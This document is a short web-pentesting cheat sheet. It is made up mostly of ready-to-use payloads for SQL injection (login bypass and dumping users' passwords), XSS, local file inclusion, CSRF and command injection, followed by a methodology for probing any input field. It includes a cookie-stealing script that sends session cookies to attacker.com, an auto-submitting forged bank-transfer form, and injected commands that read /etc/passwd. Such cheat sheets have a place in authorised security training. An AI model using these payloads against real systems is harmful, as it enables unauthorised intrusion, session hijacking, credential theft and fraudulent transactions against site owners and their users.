# The Pentester's Core Vulnerability Cheat Sheet
*No fluff, just the stuff you'll actually use.*

## 1. SQL Injection (SQLi)
**Goal:** Bypass login, steal data from the database.

### Quick Detection:
Try these in any input field (login, search, product ID):
```sql
'
"
`
')
")
`)
'))
"))
`))
```
*If you get a database error, it's vulnerable.*

### Simple Exploits:
**Bypass Login:**
```sql
' OR '1'='1
' OR 1=1-- -
admin'-- -
```
*Use in username/password fields.*

**Get Database Info:**
```sql
' UNION SELECT username, password FROM users-- -
```
*Works if you know the table/column names.*

**Tool for Automation:**
```bash
sqlmap -u "http://site.com/page?id=1" --batch
```

## 2. Cross-Site Scripting (XSS)
**Goal:** Execute malicious JavaScript in a victim's browser.

### Quick Detection:
Try these in search bars, comment fields, contact forms:
```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
```
*If a pop-up appears, it's vulnerable.*

### Simple Exploits:
**Steal Cookies:**
```html
<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>
```
*Sends the user's session cookie to you.*

**Tool for Automation:**
```bash
# Use Burp Suite's Scanner or a simple script.
```

## 3. Local File Inclusion (LFI)
**Goal:** Read sensitive files on the server.

### Quick Detection:
Look for URL parameters like `?file=about.php` or `?page=index`. Try:
```bash
../../../../etc/passwd
....//....//....//etc/passwd
```
*If the server's password file shows up, it's vulnerable.*

### Simple Exploits:
**Read Important Files:**
```bash
# Linux
../../../../etc/passwd
../../../../etc/hosts

# Windows
..\..\..\..\windows\system32\drivers\etc\hosts
```

## 4. Cross-Site Request Forgery (CSRF)
**Goal:** Trick a logged-in user into performing an action without their knowledge.

### The Concept:
If a user is logged into `bank.com`, you can make their browser send a request to `bank.com/transfer?amount=1000&to=attacker` from your evil site.

### Simple Exploit:
**Create a hidden form on your evil site:**
```html
<form action="http://bank.com/transfer" method="POST">
  <input type="hidden" name="amount" value="1000">
  <input type="hidden" name="to" value="attacker">
</form>
<script>document.forms[0].submit();</script>
```

---

## 5. Command Injection
**Goal:** Run operating system commands on the server.

### Quick Detection:
Look for inputs that might interact with the system (ping, traceroute, file upload). Try:
```bash
; whoami
| whoami
`whoami`
$(whoami)
```
*If the server's username appears, it's vulnerable.*

### Simple Exploits:
**Basic Recon:**
```bash
; whoami          # Current user
; pwd             # Current directory
; ls -la          # List files
; cat /etc/passwd # Read file
```

## The Simple Methodology

1.  **Find Inputs:** Look for any field or URL parameter where you can type stuff.
    *   Login forms
    *   Search bars
    *   URL parameters (`?id=1`, `?file=cat.jpg`)
    *   Contact forms
    *   HTTP Headers (like `User-Agent` or `X-Forwarded-For`)

2.  **Probe:** For each input, throw the basic payloads from above at it.
    *   `'`
    *   `<script>alert(1)</script>`
    *   `../../etc/passwd`
    *   `; whoami`

3.  **Observe:** Watch for:
    *   **Errors** (especially database errors)
    *   **Unexpected Output** (a password file, a username)
    *   **Behavior Changes** (you get logged in, a command runs)

4.  **Exploit:** If something works, use the simple exploits above to prove it.

### The One Command to Rule Them All

When you find a potential vulnerability, let **Burp Suite** or **OWASP ZAP** do the heavy lifting. Just right-click and "Actively Scan".
